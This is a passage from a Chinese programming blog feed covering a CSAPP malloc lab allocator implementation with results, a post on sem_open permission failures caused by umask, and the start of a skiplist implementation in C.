class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size, <span class="type">int</span> idx)</span>;</span><br><span class="line"><span class="comment">/* 移除第i条分离链表上的节点p; 如p不在链表中，则删除失败返回false,否则返回true */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">delete_node_by_list_index</span><span class="params">(<span class="type">void</span> *p, <span class="type">int</span> size, <span class="type">int</span> idx)</span>;</span><br></pre></td></tr></table></figure>

<h5 id="insert-node"><a href="#insert-node" class="headerlink" title="insert_node"></a>insert_node</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">int</span> list_size;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        list_size = (<span class="number">1</span> &lt;&lt; (MIN_INDEX + i));</span><br><span class="line">        <span class="keyword">if</span> (size &gt; list_size) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        insert_node_by_list_index(p, size, i);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="delete-node"><a href="#delete-node" class="headerlink" title="delete_node"></a>delete_node</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> list_size;</span><br><span class="line">    <span class="type">int</span> size = GET_SIZE(HDRP(p));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        list_size = (<span class="number">1</span> &lt;&lt; (MIN_INDEX + i));</span><br><span class="line">        <span class="keyword">if</span> (size &lt;= list_size) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 查找每条分离链表，尝试从链表中删除p</span></span><br><span class="line">    <span class="keyword">for</span> ( ; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (delete_node_by_list_index(p, size, i)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="coalesace"><a href="#coalesace" class="headerlink" title="coalesace"></a>coalesace</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="type">int</span> prev_alloc = GET_ALLOC(HDRP(PREV_BLKP(p)));</span><br><span class="line">    <span class="type">int</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(p)));</span><br><span class="line">    <span class="type">int</span> size = GET_SIZE(HDRP(p));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;             <span class="comment">// 前后块均已分配，不可合并</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;			<span class="comment">// 前面的块已分配，后面的块未分配</span></span><br><span class="line">        delete_node(p);</span><br><span class="line">        delete_node(NEXT_BLKP(p));</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(p)));</span><br><span class="line">        PUT(HDRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;		<span class="comment">// 前面的块未分配，后面的块已分配</span></span><br><span class="line">        delete_node(PREV_BLKP(p));</span><br><span class="line">        delete_node(p);</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(p)));</span><br><span class="line">        PUT(FTRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(p)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        p = PREV_BLKP(p);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                                     <span class="comment">// 前后两个块都空闲，一次性合并三个块</span></span><br><span class="line">        delete_node(PREV_BLKP(p));</span><br><span class="line">        delete_node(p);</span><br><span class="line">        delete_node(NEXT_BLKP(p));</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(p))) + GET_SIZE(HDRP(NEXT_BLKP(p)));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(p)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(p)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        p = PREV_BLKP(p);</span><br><span class="line">    &#125;</span><br><span class="line">    insert_node(p, size);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="place"><a href="#place" class="headerlink" title="place"></a>place</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 32位系统，块最小为 4 + 2 * 4 + 4 = 16字节</span></span><br><span class="line"><span class="comment">// 64位系统, 块最小为 4 + 2 * 8 + 4 = 24字节</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">place</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">int</span> max_size = GET_SIZE(HDRP(p));</span><br><span class="line">    <span class="type">int</span> delta_size = max_size - size;</span><br><span class="line">    delete_node(p);</span><br><span class="line">    <span class="comment">// 如剩余大小少于最小块大小, 不做分割</span></span><br><span class="line">    <span class="keyword">if</span> (delta_size &lt; MIN_BLOCK_SIZE) &#123;</span><br><span class="line">        PUT(HDRP(p), PACK(max_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(p), PACK(max_size, <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 否则需要分割，并将分割后的空闲块加到空闲链表</span></span><br><span class="line">    PUT(HDRP(p), PACK(size, <span class="number">1</span>));</span><br><span class="line">    PUT(FTRP(p), PACK(size, <span class="number">1</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(p)), PACK(delta_size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(NEXT_BLKP(p)), PACK(delta_size, <span class="number">0</span>));</span><br><span class="line">    insert_node(NEXT_BLKP(p), delta_size);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    size = ALIGN(size);</span><br><span class="line">    <span class="type">void</span> *p;</span><br><span class="line">    <span class="keyword">if</span> ((p = mem_sbrk(size)) == (<span class="type">void</span> *)<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;extend_heap failed! mem_sbrk return -1!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(p)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">    insert_node(p, size);</span><br><span class="line">    <span class="keyword">return</span> coalesce(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="初始化堆-——-mm-init"><a href="#初始化堆-——-mm-init" class="headerlink" title="初始化堆 —— mm_init"></a>初始化堆 —— mm_init</h4><p>调用mm_init后，堆数组结构如下图所示：<br><img src="/2020/09/26/2020-09-26-csapp-malloclab/image8.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 4字节对齐块 + MAX_LIST_NUM * DSIZE字节的空闲链表头指针 + 2个4字节序言块 + 4字节结尾块</span></span><br><span class="line">    <span class="type">char</span> *p = mem_sbrk(MAX_LIST_NUM * <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>) + <span class="number">4</span> * WSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span> *)p == (<span class="type">void</span> *)(<span class="number">-1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将所有空闲链表的头指针初始为NULL</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        PUT_P(p + i * <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    p += MAX_LIST_NUM * <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>);</span><br><span class="line"></span><br><span class="line">    PUT(p, <span class="number">0</span>);								<span class="comment">// 4字节对齐块，填0;</span></span><br><span class="line">    PUT(p + WSIZE, PACK(DSIZE, <span class="number">1</span>));			<span class="comment">// 序言块头部，4字节</span></span><br><span class="line">    PUT(p + <span class="number">2</span> * WSIZE, PACK(DSIZE, <span class="number">1</span>));		<span class="comment">// 序言块脚部，4字节</span></span><br><span class="line">    PUT(p + <span class="number">3</span> * WSIZE, PACK(<span class="number">0</span>, <span class="number">1</span>));			<span class="comment">// 结尾快，4字节</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((p = extend_heap(CHUNKSIZE)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分配块-——-mm-malloc"><a href="#分配块-——-mm-malloc" class="headerlink" title="分配块 —— mm_malloc"></a>分配块 —— mm_malloc</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    size = get_malloc_size(size);	<span class="comment">// 得到调整后的malloc请求大小</span></span><br><span class="line">    <span class="comment">// 寻找空闲链表是否有合适的空闲块。如果没找到合适的空闲块, 需要扩展堆</span></span><br><span class="line">    <span class="type">void</span> *p = find_free_block(size);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((p = extend_heap(MAX(size, CHUNKSIZE))) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mm_malloc, extend_heap failed!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    p = place(p, size);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="释放块-——-mm-free"><a href="#释放块-——-mm-free" class="headerlink" title="释放块 —— mm_free"></a>释放块 —— mm_free</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    <span class="comment">// 将释放后的空闲块重新插入到分离链表中</span></span><br><span class="line">    insert_node(ptr, size);</span><br><span class="line">    coalesce(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="重分配块-——-mm-realloc"><a href="#重分配块-——-mm-realloc" class="headerlink" title="重分配块 —— mm_realloc"></a>重分配块 —— mm_realloc</h4><p>函数原型：<code>void *mm_realloc(void *p, size_t size)</code>， 优化点如下：</p>
<ul>
<li><p>如<code>size</code>小于原来的块大小，简单返回原块即可。</p>
</li>
<li><p>如下一块为空闲块，且<code>空闲块大小 + 原块大小 &gt;= size</code>, 直接合并这两个块。</p>
</li>
<li><p>否则，只能用<code>malloc</code>申请新的空闲块，复制原块，再调用<code>free</code>释放原块</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span> || size == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果realloc请求的size小于原来的大小，简单返回原块</span></span><br><span class="line">    size = get_malloc_size(size);</span><br><span class="line">    <span class="type">int</span> old_size = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">if</span> (old_size &gt;= size) &#123;</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 考虑下一个块是否空闲块，能否直接合并</span></span><br><span class="line">    <span class="type">int</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">    <span class="type">int</span> next_size = GET_SIZE(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">    <span class="keyword">if</span> (!next_alloc &amp;&amp; (next_size &gt;= size - old_size)) &#123;</span><br><span class="line">        delete_node(NEXT_BLKP(ptr));</span><br><span class="line">        PUT(HDRP(ptr), PACK(next_size + old_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(ptr), PACK(next_size + old_size, <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只能使用malloc申请新的空闲块，复制原块内容，并调用free释放原块</span></span><br><span class="line">    <span class="type">void</span> *oldptr = ptr;</span><br><span class="line">    ptr = mm_malloc(size);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, oldptr, old_size);</span><br><span class="line">    mm_free(oldptr);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="实验结果-1"><a href="#实验结果-1" class="headerlink" title="实验结果"></a>实验结果</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># ./mdriver -t traces/ -V</span><br><span class="line">Results for mm malloc:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   99%    5694  0.000886  6430</span><br><span class="line"> 1       yes   99%    5848  0.000793  7379</span><br><span class="line"> 2       yes   99%    6648  0.000903  7359</span><br><span class="line"> 3       yes   99%    5380  0.000749  7182</span><br><span class="line"> 4       yes   66%   14400  0.001754  8212</span><br><span class="line"> 5       yes   96%    4800  0.001114  4308</span><br><span class="line"> 6       yes   95%    4800  0.001112  4317</span><br><span class="line"> 7       yes   55%   12000  0.004104  2924</span><br><span class="line"> 8       yes   51%   24000  0.014884  1612</span><br><span class="line"> 9       yes   87%   14401  0.001490  9667</span><br><span class="line">10       yes   67%   14401  0.001074 13405</span><br><span class="line">Total          83%  112372  0.028862  3893</span><br><span class="line"></span><br><span class="line">Perf index = 50 (util) + 40 (thru) = 90/100</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
<p><a href="https://littlecsd.net/2019/02/14/csapp-Malloclab/">https://littlecsd.net/2019/02/14/csapp-Malloclab/</a></p>
<p><a href="https://www.cnblogs.com/liqiuhao/p/8252373.html">https://www.cnblogs.com/liqiuhao/p/8252373.html</a></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>sem_open打开信号量失败案例分析</title>
    <url>/2020/11/14/2020-11-14-sem-open-failure-case/</url>
    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>root进程调<code>sem_open(XXX, O_CREAT, 0666, 1)</code>创建信号量后，非root进程使用<code>sem_open</code>打开同一个信号量失败，报<code>Permission Denied</code>错</p>
<h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>非root进程调用<code>sem_open</code>， 以<code>O_CREAT</code>方式打开信号量，需要同时有对该信号量文件的读权限 + 写权限。</p>
<p><code>ll /dev/shm/sem.semname</code> 查看信号量文件权限，发现权限为0644，缺少其他用户写权限。这个权限与sem_open中指定的权限值0666不一致。</p>
<span id="more"></span>

<h4 id="为什么sem-open中mode参数指定的权限-0666-和创建文件的实际权限-0644-不一致？"><a href="#为什么sem-open中mode参数指定的权限-0666-和创建文件的实际权限-0644-不一致？" class="headerlink" title="为什么sem_open中mode参数指定的权限(0666)和创建文件的实际权限(0644)不一致？"></a>为什么sem_open中mode参数指定的权限(0666)和创建文件的实际权限(0644)不一致？</h4><p>首先了解Linux中umask的概念。umask为用户文件创建掩码，是一种进程属性。当进程创建文件或目录时，该属性用于指明应屏蔽的权限位。大多数Linux系统的默认掩码为022，可在shell中通过umask命令查看。umask作用如下：</p>
<ul>
<li>若没有文件掩码，则创建文件的默认权限为0666, 创建目录的默认权限为0777</li>
<li>若使用默认掩码022, 则创建文件的权限为0666 - 0022 &#x3D; 0644, 创建目录的权限为 0777 - 0022 &#x3D; 0755</li>
</ul>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>可以在进程调用<code>sem_open</code>之前，修改umask值为0，再创建有其他用户写权限的信号量即可。</p>
<p>系统调用umask()可以将进程的umask值改为mask参数所指定的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">mode_t</span> <span class="title function_">umask</span><span class="params">(<span class="type">mode_t</span> mask)</span>; <span class="comment">//调用总是成功，返回值为进程的前一个umask的值</span></span><br></pre></td></tr></table></figure>

<p>写法参考如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">sem_t</span> *<span class="title function_">SemOpen</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">mode_t</span> mask = umask(<span class="number">0</span>);							<span class="comment">// 取消屏蔽的权限位</span></span><br><span class="line">	<span class="type">sem_t</span> *sem = sem_open(XXX, O_CREAT, <span class="number">0666</span>, <span class="number">1</span>);	<span class="comment">// 创建权限0666的二值有名信号量</span></span><br><span class="line">	umask(mask);									<span class="comment">// 恢复umask的值</span></span><br><span class="line">	<span class="keyword">return</span> sem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《Linux&#x2F;UNIX系统编程手册(上)》 —— 15.4.6 进程的文件模式创建掩码</p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>设计跳表, C语言实现</title>
    <url>/2020/12/05/2020-12-05-design-skiplist-by-c/</url>
    <content><![CDATA[<h3 id="跳跃表简介"><a href="#跳跃表简介" class="headerlink" title="跳跃表简介"></a>跳跃表简介</h3><p>跳跃表是<strong>一种以O(log N)期望时间支持查找、插入、删除操作的、有序的</strong>数据结构。其性能和红黑树相当，且跳跃表实现更为简单。</p>
<h3 id="如何理解”跳跃“二字"><a href="#如何理解”跳跃“二字" class="headerlink" title="如何理解”跳跃“二字"></a>如何理解”跳跃“二字</h3><span id="more"></span>

<ol>
<li>首先，考察一个有序的单链表。如下图所示，该链表由8个元素组成，为了查找元素14，需要依次遍历 2 -&gt; 4 -&gt; 6 -&gt; 8 -&gt; 10 -&gt; 12 -&gt; 14, 共考察7个节点。考察的节点数正比于链表长度，查找的时间复杂度为O(n)，效率很低。</li>
</ol>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image1.png"></p>
<ol start="2">
<li><p>为了加快查找速度，可以对单链表进行改造，每隔一个节点新增一个指针，指向它前面两个位置上的节点。所有新增的节点组成一条新的单链表(下图中的链表1)。同样查找元素14，现在只需考察4, 8, 12, 14，共4个节点。<br><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image2.png"></p>
</li>
<li><p>对链表1做类似的操作，又得到一条新的单链表(下图中的链表2)。此时查找元素14，只需考察8, 12, 14，共3个节点。</p>
</li>
</ol>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image3.png"></p>
<p>可以看出，跳跃表是<strong>由多条有序链表组成，支持折半查找</strong>的数据结构。</p>
<h3 id="实现跳跃表"><a href="#实现跳跃表" class="headerlink" title="实现跳跃表"></a>实现跳跃表</h3><p>以下用C语言实现一个简单的跳表。跳表实现要求如下，详细参考：<a href="https://leetcode-cn.com/problems/design-skiplist/">LeetCode 1206 设计跳表</a></p>
<ul>
<li>需实现跳表<strong>创建、查找、插入、删除、释放</strong>等操作，不需实现区间查找。</li>
<li>跳表中的元素类型均为<code>int</code>。</li>
<li>跳表中可以存在多个相同的值。</li>
</ul>
<h4 id="0-数据结构设计"><a href="#0-数据结构设计" class="headerlink" title="0. 数据结构设计"></a>0. 数据结构设计</h4><p>设计<code>SkiplistNode</code>结构表示跳跃表节点，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> value;							<span class="comment">// 存储值</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">SkiplistLevel</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">next</span>;</span></span><br><span class="line">	&#125; level[];							<span class="comment">// 层，这里设计成柔性数组，简化malloc和free操作</span></span><br><span class="line">&#125; SkiplistNode;</span><br></pre></td></tr></table></figure>

<p>设计<code>Skiplist</code>结构持有这些跳跃表节点，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">head</span>;</span>			<span class="comment">// 跳跃表表头节点</span></span><br><span class="line">    <span class="type">int</span> length;							<span class="comment">// 跳跃表节点数，获取跳跃表长度的时间复杂度O(1)</span></span><br><span class="line">    <span class="type">int</span> level;							<span class="comment">// 记录跳跃表内，层数最大的那个节点的层数。</span></span><br><span class="line">&#125; Skiplist;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>length</code>表示跳跃表节点数，使得获取跳表长度的时间复杂度降为O(1)。</li>
<li><code>level</code>表示跳表层数，跳表的插入、删除操作需要读取和更新<code>level</code>的值。</li>
</ul>
<p>下图表示一个层数为3的节点：</p>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image4.png"></p>
<p>下图表示一个长度为6，层数为4的跳表：</p>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image5.png"></p>
<h4 id="1-创建跳跃表"><a href="#1-创建跳跃表" class="headerlink" title="1. 创建跳跃表"></a>1. 创建跳跃表</h4><p>设计<code>Skiplist* skiplistCreate()</code>方法创建跳跃表，要点如下：</p>
<ul>
<li>给Skiplist分配空间，长度初始为0，层高初始为1</li>
<li>创建并初始化跳表的附加头节点，并设置层高为<code>SKIPLIST_MAXLEVEL</code>(32)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SKIPLIST_MAXLEVEL 32</span></span><br><span class="line"><span class="comment">// 跳表的创建</span></span><br><span class="line">Skiplist* <span class="title function_">skiplistCreate</span><span class="params">()</span> &#123;</span><br><span class="line">    Skiplist *sl = (Skiplist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*sl));</span><br><span class="line">    sl-&gt;length = <span class="number">0</span>;</span><br><span class="line">    sl-&gt;level = <span class="number">1</span>;</span><br><span class="line">    sl-&gt;head = skiplistNodeCreate(SKIPLIST_MAXLEVEL, INT_MIN); <span class="comment">// 初始化表头节点的层高为32</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SKIPLIST_MAXLEVEL; ++i) &#123;</span><br><span class="line">        sl-&gt;head-&gt;level[i].next = <span class="literal">NULL</span>;		<span class="comment">// 初始化表头节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// helper func</span></span><br><span class="line">SkiplistNode* <span class="title function_">skiplistNodeCreate</span><span class="params">(<span class="type">int</span> level, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">    SkiplistNode *p = (SkiplistNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*p) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> SkiplistLevel) * level);</span><br><span class="line">    p-&gt;value = value;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-查找"><a href="#2-查找" class="headerlink" title="2. 查找"></a>2. 查找</h4><p>设计<code>bool skiplistSearch(Skiplist* obj, int target)</code>实现跳表的查找。</p>
<p>上面分析过，跳表就是由N条有序链表组成的，所以对跳表的查找相当于<strong>从高到低，依次在N条有序链表中</strong>查找。</p>
<p>举例说明，在下图给出的跳表中，查找元素60，红色箭头表示遍历过程。</p>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image6.png"></p>
<p>代码实现如下：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳表的查找, 时间复杂度O(logN)</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">skiplistSearch</span><span class="params">(Skiplist* obj, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    SkiplistNode *p = obj-&gt;head;</span><br><span class="line">    <span class="type">int</span> levelIdx = obj-&gt;level - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = levelIdx; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 如果第i层节点值小于target, 就沿着当前层继续查找</span></span><br><span class="line">        <span class="keyword">while</span> (p-&gt;level[i].next &amp;&amp; p-&gt;level[i].next-&gt;value &lt; target) &#123;</span><br><span class="line">            p = p-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第i层未找到该节点, 或者节点值已大于target, 沿着下一层继续查找</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;level[i].next == <span class="literal">NULL</span> || p-&gt;level[i].next-&gt;value &gt; target) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-插入"><a href="#3-插入" class="headerlink" title="3. 插入"></a>3. 插入</h4><p>设计<code>void skiplistAdd(Skiplist* obj, int num)</code>实现跳表的查找，要点如下：</p>
<ul>
<li>新增节点时，确定这个新增节点的层高。</li>
<li>如果新增节点的层数为N，需对这N条单链表分别执行插入操作。</li>
<li>成功插入节点后，注意更新跳表的长度和层高。</li>
</ul>
<h5 id="3-1-如何确定新增节点的层高？"><a href="#3-1-如何确定新增节点的层高？" class="headerlink" title="3.1 如何确定新增节点的层高？"></a>3.1 如何确定新增节点的层高？</h5><p>跳表使用<strong>抛硬币</strong>的思想决定一个新增节点的层高，即有1&#x2F;2的概率层数为1，1&#x2F;4的概率层数为2，1&#x2F;8的概率层数为3，以此类推。 这里实现<code>GetSkipNodeRandomLevel</code>方法，确定新增节点层高，如下：</p>
